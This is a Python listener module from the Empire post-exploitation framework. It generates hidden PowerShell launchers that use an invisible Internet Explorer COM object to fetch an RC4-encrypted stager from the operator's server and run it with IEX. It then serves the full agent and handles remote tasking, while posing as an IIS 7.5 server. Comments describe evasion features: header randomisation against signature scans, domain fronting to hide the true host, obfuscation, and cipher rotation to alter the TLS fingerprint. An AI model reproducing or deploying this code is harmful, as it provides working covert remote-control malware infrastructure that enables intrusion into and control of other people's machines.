from __future__ import print_function

import base64
import copy
import json
import logging
import os
import random
import ssl
import sys
import time
from builtins import object, str
from typing import List, Optional, Tuple

from flask import Flask, make_response, render_template, request, send_from_directory

# from pydispatch import dispatcher
from werkzeug.serving import WSGIRequestHandler

from empire.server.common import encryption, helpers, packets
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_validate_message


class Listener(object):
    def __init__(self, mainMenu, params=[]):

        self.info = {
            "Name": "HTTP[S] COM",
            "Authors": ["@harmj0y"],
            "Description": (
                "Starts a http[s] listener (PowerShell only) that uses a GET/POST approach "
                "using a hidden Internet Explorer COM object. If using HTTPS, valid certificate required."
            ),
            "Category": ("client_server"),
            "Comments": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "http_com",
            },
            "Host": {
                "Description": "Hostname/IP for staging.",
                "Required": True,
                "Value": "http://%s" % (helpers.lhost()),
            },
            "BindIP": {
                "Description": "The IP to bind to on the control server.",
                "Required": True,
                "Value": "0.0.0.0",
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "2c103f2c4ed1e59c0b4e2e01821770fa",
            },
            "DefaultDelay": {
                "Description": "Agent delay/reach back interval (in seconds).",
                "Required": True,
                "Value": 5,
            },
            "DefaultJitter": {
                "Description": "Jitter in agent reachback interval (0.0-1.0).",
                "Required": True,
                "Value": 0.0,
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 60,
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent.",
                "Required": True,
                "Value": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            },
            "CertPath": {
                "Description": "Certificate path for https listeners.",
                "Required": False,
                "Value": "",
            },
            "KillDate": {
                "Description": "Date for the listener to exit (MM/dd/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            },
            "RequestHeader": {
                "Description": "Cannot use Cookie header, choose a different HTTP request header for comms.",
                "Required": True,
                "Value": "CF-RAY",
            },
            "Headers": {
                "Description": "Headers for the control server.",
                "Required": True,
                "Value": "Server:Microsoft-IIS/7.5",
            },
            "SlackURL": {
                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                "Required": False,
                "Value": "",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

        # randomize the length of the default_response and index_page headers to evade signature based scans
        self.header_offset = random.randint(0, 64)

    def default_response(self):
        """
        Returns an IIS 7.5 404 not found page.
        """
        return render_template("default.html")

    def validate_options(self) -> Tuple[bool, Optional[str]]:
        """
        Validate all options for this listener.
        """

        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        for key in self.options:
            if self.options[key]["Required"] and (
                str(self.options[key]["Value"]).strip() == ""
            ):
                return handle_validate_message(f'[!] Option "{key}" is required.')

        # If we've selected an HTTPS listener without specifying CertPath, let us know.
        if (
            self.options["Host"]["Value"].startswith("https")
            and self.options["CertPath"]["Value"] == ""
        ):
            return handle_validate_message(
                "[!] HTTPS selected but no CertPath specified."
            )

        return True, None

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscationCommand="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: List[str] = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses
        if not language:
            print(
                helpers.color(
                    "[!] listeners/http_com generate_launcher(): no language specified!"
                )
            )
            return None

        # Previously, we had to do a lookup for the listener and check through threads on the instance.
        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
        if (
            True
        ):  # The true check is just here to keep the indentation consistent with the old code.
            active_listener = self
            # extract the set options for this instantiated listener
            listenerOptions = active_listener.options

            host = listenerOptions["Host"]["Value"]
            launcher = listenerOptions["Launcher"]["Value"]
            staging_key = listenerOptions["StagingKey"]["Value"]
            profile = listenerOptions["DefaultProfile"]["Value"]
            requestHeader = listenerOptions["RequestHeader"]["Value"]
            uris = [a for a in profile.split("|")[0].split(",")]
            stage0 = random.choice(uris)
            customHeaders = profile.split("|")[2:]

            if language.startswith("po"):
                # PowerShell

                stager = '$ErrorActionPreference = "SilentlyContinue";'
                if safeChecks.lower() == "true":
                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                    for bypass in bypasses:
                        stager += bypass
                    stager += "};"
                    stager += "[System.Net.ServicePointManager]::Expect100Continue=0;"

                # TODO: reimplement stager retries?

                # check if we're using IPv6
                listenerOptions = copy.deepcopy(listenerOptions)
                bindIP = listenerOptions["BindIP"]["Value"]
                port = listenerOptions["Port"]["Value"]
                if ":" in bindIP:
                    if "http" in host:
                        if "https" in host:
                            host = (
                                "https://" + "[" + str(bindIP) + "]" + ":" + str(port)
                            )
                        else:
                            host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)

                # code to turn the key string into a byte array
                stager += (
                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
                )

                # this is the minimized RC4 stager code from rc4.ps1
                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    staging_key,
                    sessionID="00000000",
                    language="POWERSHELL",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket)

                stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
                stager += f"$ser={ data_util.obfuscate_call_home_address(host) };$t='{ stage0 }';"

                # add the RC4 packet to a header location
                stager += f'$c="{ requestHeader }: { b64RoutingPacket }'

                # Add custom headers if any
                modifyHost = False
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(":")[0]
                        headerValue = header.split(":")[1]

                        if headerKey.lower() == "host":
                            modifyHost = True

                        stager += f"`r`n{ headerKey }: { headerValue }"

                stager += '";'
                # If host header defined, assume domain fronting is in use and add a call to the base URL first
                # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                if modifyHost:
                    stager += "$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};"

                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
                stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
                stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
                stager += (
                    "try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}"
                )
                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"

                # decode everything and kick it over to IEX to kick off execution
                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"

                if obfuscate:
                    stager = data_util.obfuscate(
                        self.mainMenu.installPath,
                        stager,
                        obfuscationCommand=obfuscationCommand,
                    )
                # base64 encode the stager and return it
                if encode and (
                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
                ):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            else:
                print(
                    helpers.color(
                        "[!] listeners/http_com generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module."
                    )
                )

        else:
            print(
                helpers.color(
                    "[!] listeners/http_com generate_launcher(): invalid listener name specification!"
                )
            )

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscationCommand="",
        language=None,
    ):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            print(
                helpers.color(
                    "[!] listeners/http_com generate_stager(): no language specified!"
                )
            )
            return None

        profile = listenerOptions["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        host = listenerOptions["Host"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        customHeaders = profile.split("|")[2:]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == "powershell":

            # read in the stager base
            f = open("%s/data/agent/stagers/http_com.ps1" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            # Get the random function name generated at install and patch the stager with the proper function name
            stager = data_util.keyword_obfuscation(stager)

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            # Patch in custom Headers
            headers = ""
            if customHeaders != []:
                crlf = False
                for header in customHeaders:
                    headerKey = header.split(":")[0]
                    headerValue = header.split(":")[1]

                    # Host header TLS SNI logic done within http_com.ps1
                    if crlf:
                        headers += "`r`n"
                    else:
                        crlf = True
                    headers += "%s: %s" % (headerKey, headerValue)
                stager = stager.replace(
                    '$customHeaders = "";', '$customHeaders = "' + headers + '";'
                )

            # patch the server and key information
            stager = stager.replace("REPLACE_SERVER", host)
            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
            stager = stager.replace("index.jsp", stage1)
            stager = stager.replace("index.php", stage2)

            # patch in working hours, if any
            if workingHours != "":
                stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)

            unobfuscated_stager = ""
            stagingKey = stagingKey.encode("UTF-8")

            for line in stager.split("\n"):
                line = line.strip()
                # skip commented line
                if not line.startswith("#"):
                    unobfuscated_stager += line

            if obfuscate:
                unobfuscated_stager = data_util.obfuscate(
                    self.mainMenu.installPath,
                    unobfuscated_stager,
                    obfuscationCommand=obfuscationCommand,
                )
            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(unobfuscated_stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(
                    RC4IV + stagingKey, unobfuscated_stager.encode("UTF-8")
                )
            else:
                # otherwise just return the case-randomized stager
                return unobfuscated_stager

        else:
            print(
                helpers.color(
                    "[!] listeners/http_com generate_stager(): invalid language specification, only 'powershell' is current supported for this module."
                )
            )

    def generate_agent(
        self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""
    ):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            print(
                helpers.color(
                    "[!] listeners/http_com generate_agent(): no language specified!"
                )
            )
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))

        if language == "powershell":

            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
            code = f.read()
            f.close()

            # Get the random function name generated at install and patch the stager with the proper function name
            code = data_util.keyword_obfuscation(code)

            # patch in the comms methods
            commsCode = self.generate_comms(
                listenerOptions=listenerOptions, language=language
            )
            code = code.replace("REPLACE_COMMS", commsCode)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", "$AgentDelay = " + str(delay))
            code = code.replace("$AgentJitter = 0", "$AgentJitter = " + str(jitter))
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                '$Profile = "' + str(profile) + '"',
            )
            code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
            # code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64DefaultResponse+'"')
            code = code.replace(
                '$DefaultResponse = ""',
                '$DefaultResponse = "' + str(b64DefaultResponse) + '"',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace(
                    "$KillDate,", "$KillDate = '" + str(killDate) + "',"
                )
            if obfuscate:
                code = data_util.obfuscate(
                    self.mainMenu.installPath,
                    code,
                    obfuscationCommand=obfuscationCommand,
                )
            return code

        else:
            print(
                helpers.color(
                    "[!] listeners/http_com generate_agent(): invalid language specification, only 'powershell' is currently supported for this module."
                )
            )

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        if language:
            if language.lower() == "powershell":

                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;

                    if(-not $IE) {
                        $Script:IE=New-Object -COM InternetExplorer.Application;
                        $Script:IE.Silent = $True
                        $Script:IE.visible = $False
                    }
                    else {
                        $Script:IE = $IE
                    }

                """ % (
                    listenerOptions["Host"]["Value"]
                )

                getTask = """
                    $script:GetTask = {
                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

                                # meta 'TASKING_REQUEST' : 4
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
                                $Headers = "%s: $RoutingCookie"
                                $script:Headers.GetEnumerator()| %%{ $Headers += "`r`n$($_.Name): $($_.Value)" }

                                # choose a random valid URI for checkin
                                $taskURI = $script:TaskURIs | Get-Random
                                $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI

                                $Script:IE.navigate2($ServerURI, 14, 0, $Null, $Headers)
                                while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
                                $html = $Script:IE.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $Script:IE.document, $Null).InnerHtml
                                try {
                                    [System.Convert]::FromBase64String($html)
                                }
                                catch {$Null}
                            }
                        }
                        catch {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            }
                        }
                    }
                """ % (
                    listenerOptions["RequestHeader"]["Value"]
                )

                sendMessage = """
                    $script:SendMessage = {
                        param($Packets)

                        if($Packets) {
                            # build and encrypt the response packet
                            $EncBytes = Encrypt-Bytes $Packets

                            # build the top level RC4 "routing packet"
                            # meta 'RESULT_POST' : 5
                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

                            $bytes=$e.GetBytes([System.Convert]::ToBase64String($RoutingPacket));

                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {

                                $Headers = ""
                                $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
                                $Headers.TrimStart("`r`n")

                                try {
                                    # choose a random valid URI for checkin
                                    $taskURI = $script:TaskURIs | Get-Random
                                    $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI

                                    $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Headers)
                                    while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
                                }
                                catch [System.Net.WebException]{
                                    # exception posting data...
                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                        # restart key negotiation
                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
                                    }
                                }
                            }
                        }
                    }
                """

                return updateServers + getTask + sendMessage

            else:
                print(
                    helpers.color(
                        "[!] listeners/http_com generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."
                    )
                )
        else:
            print(
                helpers.color(
                    "[!] listeners/http_com generate_comms(): no language specified!"
                )
            )

    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # suppress the normal Flask output
        log = logging.getLogger("werkzeug")
        log.setLevel(logging.ERROR)

        bindIP = listenerOptions["BindIP"]["Value"]
        host = listenerOptions["Host"]["Value"]
        port = listenerOptions["Port"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]

        app = Flask(__name__)
        template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
        app = Flask(__name__, template_folder=template_dir)
        self.app = app

        # Set HTTP/1.1 as in IIS 7.5 instead of /1.0
        WSGIRequestHandler.protocol_version = "HTTP/1.1"

        @app.before_request
        def check_ip():
            """
            Before every request, check if the IP address is allowed.
            """
            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                listenerName = self.options["Name"]["Value"]
                message = "[!] {} on the blacklist/not on the whitelist requested resource".format(
                    request.remote_addr
                )
                signal = json.dumps({"print": True, "message": message})
                # dispatcher.send(
                #     signal, sender="listeners/http_com/{}".format(listenerName)
                # )
                return make_response(self.default_response(), 404)

        @app.after_request
        def change_header(response):
            "Modify the headers response server."
            headers = listenerOptions["Headers"]["Value"]
            for key in headers.split("|"):
                value = key.split(":")
                response.headers[value[0]] = value[1]
            return response

        @app.after_request
        def add_proxy_headers(response):
            "Add HTTP headers to avoid proxy caching."
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            return response

        @app.errorhandler(405)
        def handle_405(e):
            """
            Returns IIS 7.5 405 page for every Flask 405 error.
            """
            return render_template("method_not_allowed.html"), 405

        @app.route("/")
        @app.route("/iisstart.htm")
        def serve_index():
            """
            Return default server web page if user navigates to index.
            """
            return render_template("index.html"), 200

        @app.route("/<path:request_uri>", methods=["GET"])
        def handle_get(request_uri):
            """
            Handle an agent GET request.

            This is used during the first step of the staging process,
            and when the agent requests taskings.
            """
            if request_uri.lower() == "welcome.png":
                # Serves image loaded by index page.
                #
                # Thanks to making it case-insensitive it works the same way as in
                # an actual IIS server
                static_dir = self.mainMenu.installPath + "/data/misc/"
                return send_from_directory(static_dir, "welcome.png")

            clientIP = request.remote_addr

            listenerName = self.options["Name"]["Value"]
            message = "[*] GET request for {}/{} from {}".format(
                request.host, request_uri, clientIP
            )
            signal = json.dumps({"print": False, "message": message})
            # dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))

            routingPacket = None
            reqHeader = request.headers.get(listenerOptions["RequestHeader"]["Value"])
            if reqHeader and reqHeader != "":
                try:

                    if reqHeader.startswith("b'"):
                        tmp = repr(reqHeader)[2:-1].replace("'", "").encode("UTF-8")
                    else:
                        tmp = reqHeader.encode("UTF-8")
                    routingPacket = base64.b64decode(tmp)
                except Exception as e:
                    routingPacket = None
                    # pass

                    # if isinstance(results, str):

            if routingPacket:
                # parse the routing packet and process the results

                dataResults = self.mainMenu.agents.handle_agent_data(
                    stagingKey, routingPacket, listenerOptions, clientIP
                )

                if dataResults and len(dataResults) > 0:
                    for (language, results) in dataResults:
                        if results:
                            if results == "STAGE0":
                                # handle_agent_data() signals that the listener should return the stager.ps1 code

                                # step 2 of negotiation -> return stager.ps1 (stage 1)
                                listenerName = self.options["Name"]["Value"]
                                message = (
                                    "[*] Sending {} stager (stage 1) to {}".format(
                                        language, clientIP
                                    )
                                )
                                signal = json.dumps({"print": True, "message": message})
                                # dispatcher.send(
                                #     signal,
                                #     sender="listeners/http_com/{}".format(listenerName),
                                # )
                                stage = self.generate_stager(
                                    language=language,
                                    listenerOptions=listenerOptions,
                                    obfuscate=self.mainMenu.obfuscate,
                                    obfuscationCommand=self.mainMenu.obfuscateCommand,
                                )
                                return make_response(base64.b64encode(stage), 200)

                            elif results.startswith(b"ERROR:"):
                                listenerName = self.options["Name"]["Value"]
                                message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(
                                    request_uri, clientIP, results
                                )
                                signal = json.dumps({"print": True, "message": message})
                                # dispatcher.send(
                                #     signal,
                                #     sender="listeners/http_com/{}".format(listenerName),
                                # )

                                if "not in cache" in results:
                                    # signal the client to restage
                                    print(
                                        helpers.color(
                                            "[*] Orphaned agent from %s, signaling retaging"
                                            % (clientIP)
                                        )
                                    )
                                    return make_response(self.default_response(), 401)
                                else:
                                    return make_response(self.default_response(), 404)

                            else:
                                # actual taskings
                                listenerName = self.options["Name"]["Value"]
                                message = "[*] Agent from {} retrieved taskings".format(
                                    clientIP
                                )
                                signal = json.dumps(
                                    {"print": False, "message": message}
                                )
                                # dispatcher.send(
                                #     signal,
                                #     sender="listeners/http_com/{}".format(listenerName),
                                # )
                                return make_response(base64.b64encode(results), 200)
                        else:
                            # dispatcher.send("[!] Results are None...", sender='listeners/http_com')
                            return make_response(self.default_response(), 404)
                else:
                    return make_response(self.default_response(), 404)

            else:
                listenerName = self.options["Name"]["Value"]
                message = "[!] {} requested by {} with no routing packet.".format(
                    request_uri, clientIP
                )
                signal = json.dumps({"print": True, "message": message})
                # dispatcher.send(
                #     signal, sender="listeners/http_com/{}".format(listenerName)
                # )
                return make_response(self.default_response(), 404)

        @app.route("/<path:request_uri>", methods=["POST"])
        def handle_post(request_uri):
            """
            Handle an agent POST request.
            """

            stagingKey = listenerOptions["StagingKey"]["Value"]
            clientIP = request.remote_addr

            # the routing packet should be at the front of the binary request.data
            #   NOTE: this can also go into a cookie/etc.
            try:
                requestData = base64.b64decode(request.get_data())
            except:
                requestData = None

            dataResults = self.mainMenu.agents.handle_agent_data(
                stagingKey, requestData, listenerOptions, clientIP
            )
            if dataResults and len(dataResults) > 0:
                for (language, results) in dataResults:
                    if isinstance(results, str):
                        results = results.encode("UTF-8")
                    if results:
                        if results.startswith(b"STAGE2"):
                            # TODO: document the exact results structure returned
                            sessionID = results.split(b" ")[1].strip().decode("UTF-8")
                            sessionKey = self.mainMenu.agents.agents[sessionID][
                                "sessionKey"
                            ]

                            listenerName = self.options["Name"]["Value"]
                            message = "[*] Sending agent (stage 2) to {} at {}".format(
                                sessionID, clientIP
                            )
                            signal = json.dumps({"print": True, "message": message})
                            # dispatcher.send(
                            #     signal,
                            #     sender="listeners/http_com/{}".format(listenerName),
                            # )

                            # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                            agentCode = self.generate_agent(
                                language=language,
                                listenerOptions=listenerOptions,
                                obfuscate=self.mainMenu.obfuscate,
                                obfuscationCommand=self.mainMenu.obfuscateCommand,
                            )
                            encrypted_agent = encryption.aes_encrypt_then_hmac(
                                sessionKey, agentCode
                            )
                            # TODO: wrap ^ in a routing packet?

                            return make_response(base64.b64encode(encrypted_agent), 200)

                        elif results[:10].lower().startswith(b"error") or results[
                            :10
                        ].lower().startswith(b"exception"):
                            listenerName = self.options["Name"]["Value"]
                            message = (
                                "[!] Error returned for results by {} : {}".format(
                                    clientIP, results
                                )
                            )
                            signal = json.dumps({"print": True, "message": message})
                            # dispatcher.send(
                            #     signal,
                            #     sender="listeners/http_com/{}".format(listenerName),
                            # )
                            return make_response(self.default_response(), 200)
                        elif results == b"VALID":
                            listenerName = self.options["Name"]["Value"]
                            message = "[*] Valid results return by {}".format(clientIP)
                            signal = json.dumps({"print": False, "message": message})
                            # dispatcher.send(
                            #     signal,
                            #     sender="listeners/http_com/{}".format(listenerName),
                            # )
                            return make_response(self.default_response(), 200)
                        else:
                            return make_response(base64.b64encode(results), 200)
                    else:
                        return make_response(self.default_response(), 404)
            else:
                return make_response(self.default_response(), 404)

        try:
            certPath = listenerOptions["CertPath"]["Value"]
            host = listenerOptions["Host"]["Value"]
            if certPath.strip() != "" and host.startswith("https"):
                certPath = os.path.abspath(certPath)

                # support any version of tls
                pyversion = sys.version_info
                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
                    proto = ssl.PROTOCOL_TLS
                elif pyversion[0] >= 3:
                    proto = ssl.PROTOCOL_TLS
                else:
                    proto = ssl.PROTOCOL_SSLv23

                context = ssl.SSLContext(proto)
                context.load_cert_chain(
                    "%s/empire-chain.pem" % (certPath),
                    "%s/empire-priv.key" % (certPath),
                )
                # setting the cipher list allows for modification of the JA3 signature. Select a random cipher to change
                # it every time the listener is launched
                cipherlist = [
                    "ECDHE-RSA-AES256-GCM-SHA384",
                    "ECDHE-RSA-AES128-GCM-SHA256",
                    "ECDHE-RSA-AES256-SHA384",
                    "ECDHE-RSA-AES256-SHA",
                    "AES256-SHA256",
                    "AES128-SHA256",
                ]
                selectciph = random.choice(cipherlist)
                context.set_ciphers(selectciph)
                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)

        except Exception as e:
            listenerName = self.options["Name"]["Value"]
            message = "[!] Listener startup on port {} failed: {}".format(port, e)
            message += "[!] Ensure the folder specified in CertPath exists and contains your pem and private key file."
            signal = json.dumps({"print": True, "message": message})
            # dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))

    def start(self, name=""):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != "":
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions["Name"]["Value"]
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()

    def shutdown(self, name=""):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != "":
            print(helpers.color("[!] Killing listener '%s'" % (name)))
            self.threads[name].kill()
        else:
            print(
                helpers.color(
                    "[!] Killing listener '%s'" % (self.options["Name"]["Value"])
                )
            )
            self.threads[self.options["Name"]["Value"]].kill()
